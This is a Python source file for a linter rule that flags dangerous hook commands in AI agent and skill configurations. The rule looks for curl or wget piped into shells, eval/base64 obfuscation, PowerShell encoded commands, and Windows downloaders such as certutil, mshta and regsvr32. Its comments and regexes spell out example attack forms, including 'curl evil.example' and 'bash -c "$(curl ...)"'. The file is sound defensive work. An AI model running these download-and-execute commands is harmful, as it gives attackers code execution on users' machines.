"""
Rule: hooks-dangerous

Flags hook commands that match dangerous patterns: download-and-execute,
obfuscation, and suspicious runtimes or network access.
"""

import re
import shlex
from typing import Dict, List, Set

from skillsaw.diagnostics import safe_display
from skillsaw.rule import Rule, RuleViolation, Severity
from skillsaw.context import RepositoryContext
from skillsaw.rules.builtin.content_analysis import (
    AgentBlock,
    CopilotAgentBlock,
    DevinSkillBlock,
    HookEventConfig,
    HooksBlock,
    SettingsBlock,
    SkillBlock,
)

_INTERPRETERS = r"(?:node|bun|deno|python[23]?|ruby|perl|php|bash|sh|zsh|dash)"
# A variable assignment's value: quoted or unquoted. The branches are
# mutually exclusive — an unquoted run may not contain quote characters —
# because `\S*` also matches quoted strings, and inside a repeated
# assignment prefix that ambiguity is exponential again (every `A="x"`
# doubles the parses). The cost is exotic glued forms like `FOO=a"b"`.
_ASSIGN_VALUE = r"""(?:"[^"]*"|'[^']*'|[^\s"']*)"""
_VAR_ASSIGN = rf"[A-Za-z_][A-Za-z0-9_]*={_ASSIGN_VALUE}"
# `env` — optionally behind a path, with flags and NAME=value assignments —
# may prefix any command without changing which program runs
# (`env FOO=1 curl …`, `/usr/bin/env -i sh …`). Options that take a separate
# operand (`-u NAME`, `--chdir DIR`, …) consume it, so their operand is not
# mistaken for the wrapped command (`env --unset curl echo ok` runs `echo`,
# not `curl`); the operand may not start with `-`, which keeps one parse.
# The valueless-flag branch must refuse exactly those spellings, or a
# failing operand parse backtracks into the valueless one and the freed
# operand lands in command position anyway.
_ENV_OPERAND_FLAGS = r"u|unset|chdir|C|S|split-string"
_ENV_PREFIX = (
    r"(?:(?:\S+/)?env(?:"
    r"\s+-{1,2}(?:" + _ENV_OPERAND_FLAGS + r")(?:="
    rf"{_ASSIGN_VALUE}|\s+(?!-)\S+)"
    r"|\s+(?!-{1,2}(?:" + _ENV_OPERAND_FLAGS + r")\b)-{1,2}[A-Za-z][\w-]*"
    rf"|\s+[A-Za-z_][A-Za-z0-9_]*={_ASSIGN_VALUE}"
    r")*\s+)?"
)
_INTERPRETER_CMD = rf"{_ENV_PREFIX}(?:\S+/)?{_INTERPRETERS}"
_SUDO = r"(?:sudo\s+)?"

# What separates one command from the next. A newline is a separator every
# shell honours, and hook commands arrive as JSON strings where a multi-line
# script is ordinary — `"echo ok\ncurl evil.example"` runs the fetch, so
# omitting it would leave everything past the first line unscanned. A single
# `&` backgrounds the command before it and runs the next
# (`echo ready & curl evil`), so it is a boundary too — listed after `&&` in
# the alternation so the two-character operator is tried first and a real
# `&&` chain is never split into two bare-`&` boundaries. Only the
# substitution spellings `$(…)` and `<(…)` bound a command: their bodies run
# in the same shell context (`bash -c "$(curl evil.example)"`), while a bare
# `(` also appears inside quoted prose (`echo "run (python check.py) later"`)
# where nothing executes. Over-splitting a `2>&1` redirect only scans more,
# never less — the safe direction.
_CMD_BOUNDARY = r"(?:^|\n|\r|&&|\|\||;|\||&|(?:\$\(|<\())"

# Leading redirections are not commands: `2>/dev/null curl … | sh`,
# `> build.log wget …`, `2>&1 curl …`. File redirects take exactly one
# target word, glued or spaced; fd-duplication (`2>&1`) takes none. The
# operator alternation is maximal-munch (`>>` before `>`) and the target
# may not begin with another redirect operator — otherwise `>>x` parses
# both as `>>`+`x` and as `>`+`>x`, and inside the repeated group every
# extra occurrence doubles the viable parses (the same ambiguity that made
# the wrapper scan exponential). A target starting with `<`/`>` is a shell
# syntax error anyway, so refusing it loses nothing real.
_REDIRECTION = r"(?:\d*(?:>>|<<|[><])\s*(?![<>])\S+\s+|\d*&\d*\s+)*"

# Words that may sit between a command boundary and the executable without
# changing which program runs: POSIX wrappers (`command`, `exec`, `time`,
# `nohup`, …) with their option words (`sudo -n -u nobody curl …`,
# `timeout 30 curl …`). Heuristic coverage, not shell semantics. The value
# word after an option is excluded from starting anything else — a wrapper
# verb, an option, or a command head — so exactly one parse is viable at
# every position; letting an option's optional value compete with a fresh
# wrapper word made the scan exponential (`'sudo -u ' * 22 + 'notfetch'`
# cost five seconds of backtracking).
_WRAPPER_VERBS = r"(?:sudo|command|exec|builtin|time|nice|nohup|ionice|stdbuf|timeout)"
_WRAPPER_OPT = r"-{1,2}[A-Za-z][\w-]*(?:=\S+)?"
_WRAPPER_VAL = (
    r"""(?:"[^"]*"|'[^']*'|"""
    r"(?!-)"
    r"(?!sudo\b|command\b|exec\b|builtin\b|time\b|nice\b|nohup\b|ionice\b"
    r"|stdbuf\b|timeout\b|curl\b|wget\b|ncat?\b|node\b|bun\b|deno\b"
    r"|python[23]?\b|ruby\b|perl\b|php\b|bash\b|sh\b|zsh\b|dash\b|env\b)"
    r"[\w+=.-]+)"
)
_CMD_WRAPPERS = rf"(?:(?:{_WRAPPER_VERBS}|{_WRAPPER_OPT})\s+(?:{_WRAPPER_VAL}\s+)?)*"
# A download tool in command position — optionally behind wrappers,
# VAR=value assignments, an env wrapper, or a path prefix (`FOO=1 curl …`,
# `command curl …`, `/usr/bin/curl …`) — or as the string an interpreter is
# told to run (`bash -c curl …`, `node -e "…wget…"`, the exec-form hook
# join). Matching the command position instead of any word occurrence keeps
# quoted prose like `echo "use curl to fetch"` from acting as a download
# signal while every real invocation still anchors to a boundary.
_DOWNLOAD_CMD_RE = re.compile(
    rf"{_CMD_BOUNDARY}\s*{_REDIRECTION}"
    rf"(?:{_VAR_ASSIGN}\s+)*"  # VAR=value assignment prefixes
    rf"{_CMD_WRAPPERS}"
    rf"{_ENV_PREFIX}(?:\S+/)?"
    rf"(?:curl|wget)\b"
    rf"|(?:^|\n|\r|&&|\|\||;|\||&)\s*"  # command position, then…
    rf"{_CMD_WRAPPERS}(?:{_INTERPRETER_CMD})\s+"  # an interpreter…
    rf"-{{1,2}}(?:command|eval|lc|c|e)\s+[\"']?"  # running a string (maybe quoted)…
    rf"(?:sudo\s+)?(?:\S+/)?(?:curl|wget)\b"  # …that invokes a download
)
# A fetch wrapped in process or command substitution feeds an interpreter
# directly — `bash <(curl …)`, `bash -c "$(curl …)"` — with no shell
# separator between the download and the interpreter, so the substitution
# form is a download signal in its own right.
_SUBSTITUTION_FETCH_RE = re.compile(
    r"""[<$]\(\s*(?:sudo\s+)?(?:curl|wget|nc|ncat)\b  # $(curl …)  <(curl …)
        |`(?:sudo\s+)?(?:curl|wget|nc|ncat)\b          # `curl …`
    """,
    re.VERBOSE,
)
# Where a download segment writes its payload — curl/wget `-o`/`-O`,
# `--output[=] `, or a shell redirect — quoted paths included. A later
# segment that invokes one of these paths pairs the download with it even
# when intermediate commands (chmod, mv) sit between them. The target is
# the pattern's only capture group, so findall() yields paths — an
# ungrouped pattern yields whole matches, and iterating those yields
# characters that substring-match nearly every later segment.
_ARTIFACT_TARGET_RE = re.compile(r"""(?:(?:-o|-O|--output)[=\s]+|>{1,2}\s*)("[^"]*"|'[^']*'|\S+)""")
# The same boundary set as _CMD_BOUNDARY, so the tokenizer and the anchored
# patterns in this module cannot drift: `||` is one operator (splitting on
# bare `|` alone used to leave an empty middle segment that masqueraded as a
# pipe), and a single `&` backgrounds and runs the next command.
_SHELL_SEPARATOR_RE = re.compile(r"(&&|\|\||;|\||&)")
_PIPE_INTERPRETER_SEGMENT_RE = re.compile(rf"^\s*{_SUDO}(?:{_INTERPRETER_CMD})\b")
_CHAIN_INTERPRETER_SEGMENT_RE = re.compile(rf"^\s*{_SUDO}(?:{_INTERPRETER_CMD})\s+\S+")
_FETCH_WORD_RE = re.compile(r"(?:^|[^A-Za-z0-9_])(?:curl|wget)(?:$|[^A-Za-z0-9_])")
_INTERPRETER_WORD_RE = re.compile(
    r"(?:^|[^A-Za-z0-9_])(?:node|bun|deno|python[23]?|ruby|perl|php|bash|sh|zsh|dash)"
    r"(?:$|[^A-Za-z0-9_])"
)

_OBFUSCATION_RE = re.compile(
    r"""
        \beval\s+["\$(\`]                      # eval with expansion
        |base64\s+(?:-d|--decode)              # base64 decode
    """,
    re.VERBOSE,
)

_BUN_RE = re.compile(rf"{_CMD_BOUNDARY}\s*{_SUDO}(?:\S+/)?bun\s+(?:run\s+)?\S+")

_NETWORK_FETCH_RE = re.compile(
    rf"{_CMD_BOUNDARY}\s*{_REDIRECTION}"
    rf"(?:{_VAR_ASSIGN}\s+)*"  # VAR=value assignment prefixes
    rf"{_CMD_WRAPPERS}{_ENV_PREFIX}(?:\S+/)?(?:curl|wget|nc|ncat)\b"
)

# ── Windows command variants ────────────────────────────────────
#
# A handler's `commandWindows` / `command_windows` is what Codex and Muse
# Code run on Windows, and it reaches this scan like any other command —
# but the grammar above is POSIX shell, so a PowerShell one-liner sails
# through it. These patterns cover the Windows spellings of the same two
# primitives the POSIX ones cover: a download fed into execution, and an
# obfuscated payload.
#
# PowerShell is case-insensitive, so they run against the already-computed
# lowercased command rather than paying for `re.IGNORECASE`. Each one is a
# token match against the whole string — never a bounded run nested inside
# another — so a pathological command costs one linear pass per pattern.

# A PowerShell word boundary. Cmdlet names and aliases are word characters
# and hyphens, and `.` joins a member access, so `piexif` never yields the
# alias `iex` and `-noiex` is not a call either.
_PS_WORD_START = r"(?:^|[^\w.-])"
_PS_WORD_END = r"(?:$|[^\w.-])"

# Fetching a remote resource: the web cmdlets and their aliases, or a
# WebClient download member (`(New-Object Net.WebClient).DownloadString(…)`).
# A fetch alone is not dangerous — `Invoke-WebRequest -OutFile tool.zip` is
# an ordinary install step — so this only ever pairs with an execution.
_PS_DOWNLOAD_RE = re.compile(
    rf"{_PS_WORD_START}(?:iwr|irm|invoke-webrequest|invoke-restmethod){_PS_WORD_END}"
    r"|\.download(?:string|file|data)\s*\("
)
# Running what was just fetched: `iex`/`Invoke-Expression`, a pipe into
# another PowerShell, or the call operator on an expression (`& (…)`).
_PS_EXECUTE_RE = re.compile(
    rf"{_PS_WORD_START}(?:iex|invoke-expression){_PS_WORD_END}"
    rf"|\|\s*&?\s*(?:powershell|pwsh)(?:\.exe)?{_PS_WORD_END}"
    r"|&\s*\("
)

# `powershell -EncodedCommand <base64>` (and the `-enc` / `-e`
# abbreviations PowerShell accepts) keeps the payload out of the file
# entirely — the Windows spelling of the `base64 -d` pattern above.
_PS_EXE_RE = re.compile(rf"{_PS_WORD_START}(?:powershell|pwsh)(?:\.exe)?{_PS_WORD_END}")
# The bare ``-e`` is also an ordinary script parameter (``deploy.ps1 -e
# production``), so that spelling needs a blob long enough to be an
# encoded script — UTF-16 base64 of even a short command runs past forty.
_PS_ENCODED_FLAG_RE = re.compile(
    r"[-/](?:encodedcommand|enc|ec)\s+[a-z0-9+/=]{16,}" r"|[-/]e\s+[a-z0-9+/=]{40,}"
)

# Living-off-the-land binaries: signed Windows executables that fetch a
# remote payload (and, for mshta and regsvr32, run it). Each needs its own
# download flag *and* a URL, so `certutil -hashfile` or a local
# `regsvr32 x.dll` is untouched.
_URL_RE = re.compile(r"https?://")
_CERTUTIL_RE = re.compile(rf"{_PS_WORD_START}certutil(?:\.exe)?{_PS_WORD_END}")
_CERTUTIL_URLCACHE_RE = re.compile(rf"[-/]urlcache{_PS_WORD_END}")
_BITSADMIN_RE = re.compile(rf"{_PS_WORD_START}bitsadmin(?:\.exe)?{_PS_WORD_END}")
_BITSADMIN_TRANSFER_RE = re.compile(rf"[-/]transfer{_PS_WORD_END}")
# `mshta` takes the remote page as its first argument, either directly or
# behind a script scheme (`mshta javascript:GetObject("script:https://…")`).
# The scheme branch bounds its run, so both stay linear.
_MSHTA_URL_RE = re.compile(
    rf"{_PS_WORD_START}mshta(?:\.exe)?\s+[\"']?https?://"
    rf"|{_PS_WORD_START}mshta(?:\.exe)?\s+[\"']?(?:javascript|vbscript):"
    r"[^\n]{0,120}?https?://"
)
_REGSVR32_RE = re.compile(rf"{_PS_WORD_START}regsvr32(?:\.exe)?{_PS_WORD_END}")
_REGSVR32_REMOTE_RE = re.compile(r"[-/]i:\s*[\"']?https?://")
_LOLBIN_DESCRIPTION = (
    "uses a Windows living-off-the-land downloader (certutil/bitsadmin/mshta/regsvr32)"
)

#: Cheap substring gate for the POSIX patterns above.
_POSIX_TOKENS = (
    "curl",
    "wget",
    "ncat",
    "nc ",
    "eval",
    "base64",
    "bun",
)
#: Cheap substring gate for the Windows patterns. Every Windows finding
#: needs one of these, so a clean command still runs no Windows regex.
_WINDOWS_TOKENS = (
    "iwr",
    "irm",
    "invoke-web",
    "invoke-rest",
    "invoke-expression",
    "iex",
    ".download",
    "powershell",
    "pwsh",
    "certutil",
    "bitsadmin",
    "mshta",
    "regsvr32",
)


def _windows_downloads_and_executes(lower_command: str) -> bool:
    """A PowerShell fetch and an execution primitive in one command."""
    return bool(_PS_DOWNLOAD_RE.search(lower_command)) and bool(
        _PS_EXECUTE_RE.search(lower_command)
    )


def _windows_encoded_command(lower_command: str) -> bool:
    """`powershell -enc <base64>`: the payload never appears in the file."""
    return bool(_PS_EXE_RE.search(lower_command)) and bool(
        _PS_ENCODED_FLAG_RE.search(lower_command)
    )


def _windows_lolbin_download(lower_command: str) -> bool:
    """A signed Windows binary fetching a remote payload."""
    if not _URL_RE.search(lower_command):
        return False
    if (
        "certutil" in lower_command
        and _CERTUTIL_RE.search(lower_command)
        and _CERTUTIL_URLCACHE_RE.search(lower_command)
    ):
        return True
    if (
        "bitsadmin" in lower_command
        and _BITSADMIN_RE.search(lower_command)
        and _BITSADMIN_TRANSFER_RE.search(lower_command)
    ):
        return True
    if "mshta" in lower_command and _MSHTA_URL_RE.search(lower_command):
        return True
    if (
        "regsvr32" in lower_command
        and _REGSVR32_RE.search(lower_command)
        and _REGSVR32_REMOTE_RE.search(lower_command)
    ):
        return True
    return False


def _mask_quoted_separators(line: str) -> str:
    """Blank `&`, `|`, `;` inside single/double quotes before tokenizing.

    The tokenizer splits on shell separators, but a separator inside quotes
    is data — `'https://x.test/p?a=1&b=2'` is one argument, and the split
    would otherwise clear the download carry mid-URL. Unquoted lines pass
    through untouched; an unmatched quote degrades to more splitting, which
    only ever loses pairing (never invents it).

    Separators inside a double-quoted command substitution stay live —
    `"$(curl x; sh y)"` executes both — so once `$(` or a backtick appears
    inside the current double-quoted span, masking stops while it runs.
    The substitution ends where the shell's does: a backtick form at the
    closing backtick, a `$(` form when its parentheses balance — after
    which separators are data again (`echo "$(printf ok); notes"` only
    ever echoes). Single quotes never execute, so their contents stay
    masked throughout.

    Inside double quotes a backslash escapes the next character — the span
    `"escaped quote: \""` ends at the final mark, not at the escaped one —
    so an escape pair passes through untouched and cannot close the span,
    flip it live, or mask what follows. Single quotes treat backslashes as
    literal.

    Substitution markers (`$`, `<`, backtick) are masked inside quoted spans
    too: `'$(python .claude/x.sh)'` only ever echoes its literal. A `$(` or
    backtick in double quotes flips the span live before it can be masked,
    because there those forms really do execute.
    """
    if "'" not in line and '"' not in line:
        return line
    out = []
    quote = None
    live = False
    sub_depth = 0  # $( depth of the live double-quoted substitution
    backtick_live = False
    live_quote = None
    index = 0
    length = len(line)
    while index < length:
        char = line[index]
        if not quote and char == "\\" and index + 1 < length:
            # Outside quotes a backslash makes the following quote literal;
            # it must not open a phantom span that hides the rest of the
            # command's separators.
            out.append(char)
            out.append(line[index + 1])
            index += 2
            continue
        if quote == '"' and char == "\\" and index + 1 < length:
            # An escape pair is data: append both characters verbatim so
            # the escaped one can neither close nor open a quoted span.
            out.append(char)
            out.append(line[index + 1])
            index += 2
            continue
        if quote and not live:
            # The live trigger must win over masking: in double quotes a $(
            # or backtick executes, so it is never masked.
            if quote == '"' and (char == "`" or (char == "$" and line.startswith("(", index + 1))):
                live = True
                backtick_live = char == "`"
                sub_depth = 0  # the opening "(" is counted below
            elif char in "&|;$<`":
                out.append("\x00")
                index += 1
                continue
            elif char == quote:
                quote = None
        elif quote and live:
            # Track the live substitution so it can end: a backtick form
            # closes at the next backtick, a $( form when its parentheses
            # balance again.
            if live_quote:
                if live_quote == '"' and char == "\\" and index + 1 < length:
                    out.append(char)
                    out.append(line[index + 1])
                    index += 2
                    continue
                if char == live_quote:
                    live_quote = None
            elif char in "\"'":
                # Parentheses inside a nested quoted word are data, not the
                # end of the surrounding $(...) substitution.
                live_quote = char
            elif backtick_live:
                if char == "`":
                    live = False
                    backtick_live = False
            elif char == "(":
                sub_depth += 1
            elif char == ")":
                sub_depth -= 1
                if sub_depth <= 0:
                    live = False
        elif not quote and char in "\"'":
            quote = char
            live = False
        out.append(char)
        index += 1
    return "".join(out)


def _shell_words(text: str) -> List[str]:
    """Return shell-like words and grouping punctuation, or no words."""
    try:
        lexer = shlex.shlex(text, posix=True, punctuation_chars="(){}")
        lexer.whitespace_split = True
        return list(lexer)
    except ValueError:
        # An incomplete command should still be lintable by the regex path;
        # shlex uses ValueError for unmatched quotes.
        return []


def _segment_downloads(segment: str) -> bool:
    """Whether one tokenizer segment invokes curl/wget in command position."""
    if _DOWNLOAD_CMD_RE.search(segment):
        return True

    # Cover shell grouping/reserved words and executable spellings that the
    # deliberately strict regex grammar cannot express without making every
    # quote or parenthesis a false command boundary. shlex resolves `\curl`
    # and `"curl"` to their actual executable word while preserving quoted
    # prose such as `"use curl"` as one non-matching argument.
    words = _shell_words(segment.replace("\x00", " "))
    command_prefixes = {
        "(",
        "{",
        "!",
        "then",
        "do",
        "else",
        "eval",
        "xargs",
        "busybox",
    }
    for index, word in enumerate(words):
        executable = word.rsplit("/", 1)[-1]
        if executable not in {"curl", "wget"}:
            continue
        if index == 0 or words[index - 1] in command_prefixes:
            return True
    return False


def _embedded_download_executes(payload: str) -> bool:
    """Detect a download pipeline inside an already-executable code string."""
    pieces = _SHELL_SEPARATOR_RE.split(payload)
    piped_download = False
    for index in range(0, len(pieces), 2):
        if index and pieces[index - 1] != "|":
            piped_download = False
        segment = pieces[index]
        if piped_download and _INTERPRETER_WORD_RE.search(segment):
            return True
        piped_download = _FETCH_WORD_RE.search(segment) is not None
    return False


def _interpreter_payload_downloads_and_executes(command: str) -> bool:
    """Inspect shell/code strings passed to interpreters, ssh, or docker."""
    words = _shell_words(command)
    if not words:
        return False

    interpreter_seen = False
    remote_runner_seen = False
    for index, word in enumerate(words):
        executable = word.rsplit("/", 1)[-1]
        if executable in {"ssh", "docker"}:
            remote_runner_seen = True
        if executable in {
            "node",
            "bun",
            "deno",
            "python",
            "python2",
            "python3",
            "ruby",
            "perl",
            "php",
            "bash",
            "sh",
            "zsh",
            "dash",
        }:
            interpreter_seen = True
            continue
        if interpreter_seen and word in {"-c", "--command", "-lc", "-e", "--eval"}:
            if index + 1 < len(words) and _embedded_download_executes(words[index + 1]):
                return True
        if remote_runner_seen and "|" in word and _embedded_download_executes(word):
            return True
    return False


def _downloads_and_executes(command: str) -> bool:
    """Whether a download feeds or precedes an interpreter, in linear time."""
    if _interpreter_payload_downloads_and_executes(command):
        return True
    # The former unanchored ``curl.*`` patterns restarted a suffix scan at
    # every repeated token. Tokenize shell separators once instead. Newlines
    # reset the chain because the original regex deliberately did not span
    # them; each line is still scanned independently by the network rule.
    #
    # Carry rules mirror the shell: a download stays live across any number
    # of pipes because every stage consumes the previous stage's output, but
    # across ``&&``/``;``/``&`` only an interpreter directly after the
    # download pairs with it — in ``curl url; cat notes | python -`` the
    # interpreter reads local files, not the download. Nothing crosses
    # ``||``: its right side runs only when the download failed. The pairing
    # survives intermediate non-interpreter commands when they name a path
    # the download wrote (`curl -o x url && chmod +x x && sh x`), tracked by
    # the per-line artifact set. A pipeline also survives the physical line
    # break bash allows right after ``|``, so a line ending in one carries
    # the piped state into the next; a backslash-newline pair joins words,
    # so continued lines are one logical line.
    carry_pipe = False
    for line in command.replace("\\\n", " ").split("\n"):
        masked = _mask_quoted_separators(line)
        pieces = _SHELL_SEPARATOR_RE.split(masked)
        piped_download = carry_pipe
        chained_download = False
        artifact_paths: Set[str] = set()
        for index in range(0, len(pieces), 2):
            # A line continued from a trailing ``|`` has no separator piece
            # before its first segment — the pipe lives on the prior line.
            via_pipe = carry_pipe and index == 0
            via_chain = False
            if index:
                separator = pieces[index - 1]
                if separator == "|":
                    via_pipe = piped_download
                elif separator == "||":
                    # The right side runs only when everything before it
                    # failed, so a path written there was never produced.
                    artifact_paths.clear()
                else:  # "&&", ";", "&"
                    via_chain = chained_download
            segment = pieces[index]
            if not segment.strip():
                continue
            substitution_fetch = _SUBSTITUTION_FETCH_RE.search(segment) is not None
            segment_downloads = _segment_downloads(segment) or substitution_fetch
            if segment_downloads:
                # Paths are unquoted here: `curl -o "/tmp/a b"` writes one
                # file, and a later `sh "/tmp/a b"` must pair with it — a
                # word-split comparison cannot reassemble the quoted word,
                # but a substring test on the segment can.
                artifact_paths.update(
                    path.strip("\"'") for path in _ARTIFACT_TARGET_RE.findall(segment) if path
                )
                if substitution_fetch and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
                    return True  # self-contained: bash <(curl …), bash -c "$(curl …)"
            if via_pipe and _PIPE_INTERPRETER_SEGMENT_RE.match(segment):
                return True
            if via_chain and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
                return True
            if (
                artifact_paths
                and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment)
                and any(path in segment for path in artifact_paths)
            ):
                return True  # interpreter consumes a downloaded path
            piped_download = via_pipe or segment_downloads
            chained_download = segment_downloads
        stripped = masked.rstrip()
        carry_pipe = stripped.endswith("|") and not stripped.endswith("||")
    return False


def dangerous_command_descriptions(command: str) -> List[str]:
    """Return messages for dangerous patterns in a command."""
    lower_command = command.lower()
    posix_seen = any(token in lower_command for token in _POSIX_TOKENS)
    windows_seen = any(token in lower_command for token in _WINDOWS_TOKENS)
    if not posix_seen and not windows_seen:
        return []

    # Quote-aware view: separators inside quotes are argument data, so the
    # anchored patterns must not treat them as command boundaries. Masking
    # is idempotent, and _downloads_and_executes masks again per line.
    # The Windows patterns read the unmasked lowercased command instead:
    # they pair two independent primitives rather than reading a POSIX
    # command boundary, and PowerShell quoting is not the shell's.
    raw_command = command
    command = _mask_quoted_separators(raw_command)
    findings: List[str] = []

    downloads_and_executes = ("curl" in lower_command or "wget" in lower_command) and (
        _downloads_and_executes(raw_command)
    )
    if not downloads_and_executes and windows_seen:
        downloads_and_executes = _windows_downloads_and_executes(lower_command)
    if downloads_and_executes:
        findings.append("downloads and executes remote code")

    if posix_seen and _OBFUSCATION_RE.search(command):
        findings.append("uses obfuscation techniques (eval/base64)")

    if windows_seen and _windows_encoded_command(lower_command):
        findings.append("uses obfuscation techniques (PowerShell encoded command)")

    if windows_seen and _windows_lolbin_download(lower_command):
        findings.append(_LOLBIN_DESCRIPTION)

    if not findings and posix_seen and _BUN_RE.search(command):
        findings.append("uses bun runtime (uncommon in hooks, verify intent)")

    if not findings and posix_seen and _NETWORK_FETCH_RE.search(command):
        findings.append("performs network requests (verify intent)")

    return findings


class HooksDangerousRule(Rule):
    """Flag hook commands matching dangerous patterns."""

    since = "0.12.0"
    surface_dependencies = ("copilot-agent-valid",)

    config_schema = {
        "allowlist": {
            "type": "list",
            "default": [],
            "description": "Hook command spellings to permit (exact diagnostic match)",
        },
    }

    @property
    def rule_id(self) -> str:
        return "hooks-dangerous"

    @property
    def description(self) -> str:
        return (
            "Flags hook commands that chain a download into execution (curl|sh), "
            "obfuscate their payload (eval/base64), or perform network requests"
        )

    def default_severity(self) -> Severity:
        return Severity.ERROR

    def _is_allowed(self, command: str) -> bool:
        allowlist = self.setting("allowlist")
        return any(command == entry for entry in allowlist)

    def _check_events(
        self,
        events: Dict[str, List[HookEventConfig]],
        file_path,
        line=None,
    ) -> List[RuleViolation]:
        violations = []
        for event_type, configs in events.items():
            for cfg in configs:
                for handler in cfg.handlers:
                    if handler.type != "command":
                        continue
                    for command, source_line in handler.iter_effective_commands():
                        if self._is_allowed(command):
                            continue
                        for message in dangerous_command_descriptions(command):
                            violations.append(
                                self.violation(
                                    f"Hook {safe_display(event_type)}: {message} — "
                                    f"command: {safe_display(command)!r}",
                                    file_path=file_path,
                                    line=source_line or line,
                                )
                            )
        return violations

    def check(self, context: RepositoryContext) -> List[RuleViolation]:
        violations = []

        # Every host's hooks file is a HooksBlock — Claude, Codex, Muse,
        # Cursor — and each renders its own shape as HookEventConfig.
        hook_blocks = context.lint_tree.find(HooksBlock)
        for block in hook_blocks:
            if block.parse_error:
                continue
            violations.extend(self._check_events(block.events, block.path))

        for block in context.lint_tree.find(SettingsBlock):
            if block.parse_error:
                continue
            violations.extend(self._check_events(block.hooks_events, block.path))

        # Skill and agent frontmatter can declare hooks with the same schema —
        # a checked-in, shareable command-execution vector.
        for block in (
            context.lint_tree.find(SkillBlock)
            + context.lint_tree.find(DevinSkillBlock)
            + context.lint_tree.find(AgentBlock)
        ):
            if block.frontmatter_error:
                continue
            events = block.hooks_events
            if events:
                violations.extend(
                    self._check_events(events, block.path, line=block.key_line("hooks"))
                )

        if self.surface_rule_enabled("copilot-agent-valid"):
            for block in context.lint_tree.find(CopilotAgentBlock):
                if block.frontmatter_error:
                    continue
                events = block.hooks_events
                if events:
                    violations.extend(
                        self._check_events(events, block.path, line=block.key_line("hooks"))
                    )

        return violations
